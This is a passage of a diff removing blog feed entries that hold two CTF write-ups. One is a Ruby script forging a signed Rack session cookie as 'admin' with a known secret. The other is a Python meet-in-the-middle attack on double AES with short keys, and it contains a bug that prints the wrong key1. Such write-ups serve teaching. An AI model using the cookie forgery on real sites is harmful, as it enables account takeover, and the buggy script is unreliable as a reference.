-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">if</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">session_data</span>
-</span><span class='line'>    <span class="n">session_data</span><span class="p">,</span> <span class="n">digest</span> <span class="o">=</span> <span class="n">session_data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;--&quot;</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">session_data</span> <span class="o">=</span> <span class="kp">nil</span> <span class="k">unless</span> <span class="n">digest_match?</span><span class="p">(</span><span class="n">session_data</span><span class="p">,</span> <span class="n">digest</span><span class="p">)</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Meanwhile, we knew the whole process of the session checking. thus, I&rsquo;ve wrote a ruby script to figure out this stuff with this way</p>
-
-<ul>
-<li><code>unpack(decode)</code> the cookie to origin session data</li>
-<li>modify session_data.user_name to <code>admin</code></li>
-<li><code>repack(encode)</code> the session data to cookie string format</li>
-<li>calculate a new digest of the session data then build the cookie</li>
-</ul>
-
-
-<h3>code</h3>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/ruby</span>
-</span><span class='line'><span class="c1">#Author: xelz@blue-lotus</span>
-</span><span class='line'>
-</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;openssl&#39;</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1"># part of rack/lib/rack/session/cookie.rb</span>
-</span><span class='line'><span class="k">class</span> <span class="nc">Base64</span>
-</span><span class='line'>    <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
-</span><span class='line'>        <span class="o">[</span><span class="n">str</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span>
-</span><span class='line'>    <span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
-</span><span class='line'>        <span class="n">str</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
-</span><span class='line'>    <span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="c1"># Encode session cookies as Marshaled Base64 data</span>
-</span><span class='line'>    <span class="k">class</span> <span class="nc">Marshal</span> <span class="o">&lt;</span> <span class="no">Base64</span>
-</span><span class='line'>        <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
-</span><span class='line'>            <span class="k">super</span><span class="p">(</span><span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">str</span><span class="p">))</span>
-</span><span class='line'>        <span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'>        <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
-</span><span class='line'>            <span class="k">return</span> <span class="k">unless</span> <span class="n">str</span>
-</span><span class='line'>            <span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="k">super</span><span class="p">(</span><span class="n">str</span><span class="p">))</span> <span class="k">rescue</span> <span class="kp">nil</span>
-</span><span class='line'>        <span class="k">end</span>
-</span><span class='line'>    <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
-</span><span class='line'>    <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">new</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
-</span><span class='line'><span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'><span class="nb">exit</span><span class="p">()</span> <span class="k">unless</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;--&#39;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
-</span><span class='line'><span class="c1"># puts &#39;data is:&#39;</span>
-</span><span class='line'><span class="c1"># puts data, &quot;\n&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">coder</span> <span class="o">=</span> <span class="no">Base64</span><span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">new</span>
-</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-</span><span class='line'><span class="n">data</span><span class="o">[</span><span class="s1">&#39;user_name&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&quot;admin&quot;</span>
-</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-</span><span class='line'><span class="c1"># puts &#39;modified data is:&#39;</span>
-</span><span class='line'><span class="c1"># puts data, &quot;\n&quot;</span>
-</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">secret</span> <span class="o">=</span> <span class="s1">&#39;wroashsoxDiculReejLykUssyifabEdGhovHabno&#39;</span>
-</span><span class='line'><span class="c1"># puts &#39;new digest string is:&#39;</span>
-</span><span class='line'><span class="n">digest</span> <span class="o">=</span> <span class="n">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
-</span><span class='line'><span class="c1"># puts digest, &quot;\n&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nb">puts</span> <span class="s1">&#39;cookie is&#39;</span>
-</span><span class='line'><span class="n">cookie</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;%0A&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;--&#39;</span> <span class="o">+</span> <span class="n">digest</span>
-</span><span class='line'><span class="nb">puts</span> <span class="n">cookie</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>run the script like this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>xelz@blue-lotus:defconctf<span class="nv">$echo</span> -en <span class="s1">&#39;BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $1&quot;\\&quot;}&#39;</span> <span class="p">|</span> xargs ./hypeman.rb
-</span><span class='line'>cookie is
-</span><span class='line'>BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4<span class="o">=</span>%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I&rsquo;d like to use the Javascript Console in Chrome:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s1">&#39;rack.session=xxx;&#39;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>refresh the page, and enjoy :)</p>
-
-<h3>key</h3>
-
-<blockquote><p>watch out for this Etdeksogav</p></blockquote>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[BkP-CTF 2013 MITM]]></title>
-    <link href="http://xelz.info/blog/2013/06/12/bkp-ctf-2013-mitm/"/>
-    <updated>2013-06-12T19:27:34+00:00</updated>
-    <id>http://xelz.info/blog/2013/06/12/bkp-ctf-2013-mitm</id>
-    <content type="html"><![CDATA[<p>前两天BkP的CTF练习赛中的一道题，crypto 200，题目如下</p>
-
-<blockquote><p>message 1: QUVTLTI1NiBFQ0IgbW9kZSB0d2ljZSwgdHdvIGtleXM=</p>
-
-<p>encrypted: THbpB4bE82Rq35khemTQ10ntxZ8sf7s2WK8ErwcdDEc=</p>
-
-<p>message 2: RWFjaCBrZXkgemVybyB1bnRpbCBsYXN0IDI0IGJpdHM=</p>
-
-<p>encrypted: 01YZbSrta2N+1pOeQppmPETzoT/Yqb816yGlyceuEOE=</p>
-
-<p>ciphertext: s5hd0ThTkv1U44r9aRyUhaX5qJe561MZ16071nlvM9U=</p></blockquote>
-
-<p>看到最后的等号首先就想到了base64编码，decode之后得到</p>
-
-<blockquote><p>message1: AES-256 ECB mode twice, two keys</p>
-
-<p>message2: Each key zero until last 24 bits</p>
-
-<p>两轮AES-256加密，padding=ECB，key不一样，但是前面都是0x00，只有最后24位需要破解</p>
-
-<p>密文都是2进制不可读，不贴了</p></blockquote>
-
-<p>题目提示了是256位(32字节的key)，前29个字节都是0，需要破解两个key的后3个字节，纯暴力方式需要尝试2<sup>24</sup> * 2<sup>24</sup> = 2<sup>48</sup> ≈ 2.81e14种可能，这么大的计算量，显然是不现实的。</p>
-
-<!-- more -->
-
-
-<p>暴力破解，估计要用到hadoop集群了。</p>
-
-<p>其实，当时忽略了一个细节，就是题目：MITM，google一下出来的都是Man-in-the-middle Attack（中间人攻击），似乎跟这个题目半毛钱关系都没有，换用wikipedia得到了我们想要的东西：</p>
-
-<ul>
-<li>Man-in-the-middle attack, a computer networking attack method</li>
-<li>Meet-in-the-middle attack, a cryptographic attack method</li>
-</ul>
-
-
-<p>很显然，Meet-in-the-middle attack应该就是我们想找的东西了</p>
-
-<blockquote><p>Assume the attacker knows a set of plaintext P and ciphertext C that satisfies the following:</p>
-
-<ul>
-<li>C=ENCk2(ENCk1(P))</li>
-<li>P=DECk1(DECk2&copy;</li>
-</ul>
-
-
-<p>where ENC is the encryption function, DEC the decryption function defined as ENC-1 (inverse mapping) and k1 and k2 are two keys.</p>
-
-<p>The attacker can then compute ENCk1(P) for all possible keys k1. Afterwards he can decrypt the ciphertext by computing DECk2&copy; for each k2. Any matches between these two resulting sets are likely to reveal the correct keys. (To speed up the comparison, the ENCk1(P) set can be stored in an in-memory lookup table, then each DECk2&copy; can be matched against the values in the lookup table to find the candidate keys)</p></blockquote>
-
-<p>这个模型跟题目所设的是完全一样的，思路给的很清楚了，先穷举key1，计算出明文经过所有可能的key1加密后的结果，将结果存于内存中，然后穷举key2，计算密文经过key2解密后的结果，与内存中的结果集进行比对（因为AES是对称加密，加密跟解密是用的相同的key），如果有一致的，就表明破解成功了，这样算起来，时间复杂度只有2<sup>24</sup> + 2<sup>24</sup> = 2<sup>25</sup></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
-</span><span class='line'><span class="c">#! -*- coding: utf-8 -*-</span>
-</span><span class='line'>
-</span><span class='line'><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
-</span><span class='line'><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">aes_encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">):</span>
-</span><span class='line'>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">mode</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
-</span><span class='line'>    <span class="k">return</span> <span class="n">ciphertext</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">aes_decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">):</span>
-</span><span class='line'>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">mode</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
-</span><span class='line'>    <span class="k">return</span> <span class="n">plaintext</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
-</span><span class='line'>    <span class="n">message1</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">&#39;QUVTLTI1NiBFQ0IgbW9kZSB0d2ljZSwgdHdvIGtleXM=&#39;</span><span class="p">)</span>     <span class="c"># &#39;AES-256 ECB mode twice, two keys&#39;</span>
-</span><span class='line'>    <span class="n">ciphertext1</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">&#39;THbpB4bE82Rq35khemTQ10ntxZ8sf7s2WK8ErwcdDEc=&#39;</span><span class="p">)</span>  <span class="c"># &#39;\x4c\x76\xe9\x07\x86\xc4\xf3\x64\x6a\xdf\x99\x21\x7a\x64\xd0\xd7\x49\xed\xc5\x9f\x2c\x7f\xbb\x36\x58\xaf\x04\xaf\x07\x1d\x0c\x47&#39;</span>
-</span><span class='line'>    <span class="c"># message2 = b64decode(&#39;RWFjaCBrZXkgemVybyB1bnRpbCBsYXN0IDI0IGJpdHM=&#39;)     # &#39;Each key zero until last 24 bits&#39;</span>
-</span><span class='line'>    <span class="c"># ciphertext2 = b64decode(&#39;01YZbSrta2N+1pOeQppmPETzoT/Yqb816yGlyceuEOE=&#39;)  # &#39;\xd3\x56\x19\x6d\x2a\xed\x6b\x63\x7e\xd6\x93\x9e\x42\x9a\x66\x3c\x44\xf3\xa1\x3f\xd8\xa9\xbf\x35\xeb\x21\xa5\xc9\xc7\xae\x10\xe1&#39;</span>
-</span><span class='line'>    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">&#39;s5hd0ThTkv1U44r9aRyUhaX5qJe561MZ16071nlvM9U=&#39;</span><span class="p">)</span>   <span class="c"># &#39;\xb3\x98\x5d\xd1\x38\x53\x92\xfd\x54\xe3\x8a\xfd\x69\x1c\x94\x85\xa5\xf9\xa8\x97\xb9\xeb\x53\x19\xd7\xad\x3b\xd6\x79\x6f\x33\xd5&#39;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">prefix</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span> <span class="o">*</span> <span class="mi">29</span>
-</span><span class='line'>    <span class="n">clist</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">mitms</span> <span class="o">=</span> <span class="p">[]</span>
-</span><span class='line'>    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
-</span><span class='line'>        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
-</span><span class='line'>            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
-</span><span class='line'>                <span class="n">key1</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
-</span><span class='line'>                <span class="n">mitm1</span> <span class="o">=</span> <span class="n">aes_encrypt</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span> <span class="n">message1</span><span class="p">)</span>
-</span><span class='line'>                <span class="n">mitms</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">mitm1</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">mitms_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">mitms</span><span class="p">)</span>  <span class="c"># convert to set for faster index</span>
-</span><span class='line'>    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
-</span><span class='line'>        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
-</span><span class='line'>            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">clist</span><span class="p">:</span>
-</span><span class='line'>                <span class="n">key2</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
-</span><span class='line'>                <span class="n">anmitm1</span> <span class="o">=</span> <span class="n">aes_decrypt</span><span class="p">(</span><span class="n">key2</span><span class="p">,</span> <span class="n">ciphertext1</span><span class="p">)</span>
-</span><span class='line'>                <span class="k">if</span> <span class="n">anmitm1</span> <span class="ow">in</span> <span class="n">mitms_set</span><span class="p">:</span>
-</span><span class='line'>                    <span class="n">key1_suffix</span> <span class="o">=</span> <span class="n">mitms</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">anmitm1</span><span class="p">)</span>
-</span><span class='line'>                    <span class="k">print</span> <span class="s">&#39;key1: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">key1</span><span class="p">)</span>
-</span><span class='line'>                    <span class="k">print</span> <span class="s">&#39;key2: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">key2</span><span class="p">)</span>
-</span><span class='line'>                    <span class="n">msg</span> <span class="o">=</span> <span class="n">aes_decrypt</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span> <span class="n">aes_decrypt</span><span class="p">(</span><span class="n">key2</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">))</span>
-</span><span class='line'>                    <span class="k">print</span> <span class="s">&#39;message is: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">msg</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>大概5分钟左右就跑完了，缓存key1的加密结果用了1.65G内存，如果内存不够，可以对key1分段跑，不过时间就要相应变长。</p>
-
-<p>key1:</p>
-
-<blockquote><p>\x9a\xe8\x07</p></blockquote>
-
-<p>key2:</p>
-
-<blockquote><p>\xff?E</p></blockquote>
-
-<p>message is:</p>
-
-<blockquote><p>This time I didn&rsquo;t include sol&#8217;n</p></blockquote>
-]]></content>
-  </entry>
-  
-</feed>
+</body>
+</html>
